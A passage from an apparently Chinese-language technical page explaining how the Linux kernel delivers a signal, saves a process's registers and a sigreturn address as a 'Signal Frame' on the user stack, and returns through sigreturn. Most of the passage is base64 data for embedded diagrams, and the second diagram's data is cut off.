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0riQJeDru1jzqyHfDFPU9Loyn3jPu7bdZm45x1JdQRfkN4CSUvkey0ZsdUR3i2qVu8LJL7GbDTEbbT+p0XOkLLJiLtPG/uuSyjDrO2hN8nOlWY9tbH72vEMTemzpV2Pg1srdVapxGV6bNnps0ABh9wYc5alFQmr2OMuvC7Q0cJHQ11atVO62s28c4KNh5hpIg1LnREjOh/o7XxjoswfqPwR6DRAVLamvjvw/7+DKSX8fpvJGvZ+K25cr/z7MjtDiwdXNciIALlIKAXWZYDloKKgAiIgAiIgAiIgAiIgAhULgGtgalc/spdBERABERABERABERABESgHAQkYMoBS0FFQAREQAREQAREQAREQAQql4AETOXyV+4iIAIiIAIiIAIiIAIiIALlICABUw5YCioCIiACIiACIiACIiACIlC5BCRgKpe/chcBERABERABERABERABESgHAQmYcsBSUBEQAREQAREQAREQAREQgcolIAFTufyVuwiIgAiIgAiIgAiIgAiIQDkISMCUA5aCioAIiIAIiIAIiIAIiIAIVC4BCZjK5a/cRUAEREAEREAEREAEREAEykFAAqYcsBRUBERABERABERABERABESgcglIwFQuf+UuAiIgAiIgAiIgAiIgAiJQDgISMOWApaAiIAIiIAIiIAIiIAIiIAKVS0ACpnL5K3cREAEREAEREAEREAEREIFyEJCAKQcsBRUBERABERABERABERABEahcAhIwlctfuYuACIiACIiACIiACIiACJSDwP8DFl4U7KLrdJ4AAAAASUVORK5CYIINCg==)\n\n1. 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。\n2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址**。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal     Frame。**需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。\n\n![signal2-stack](data:image/png;base64,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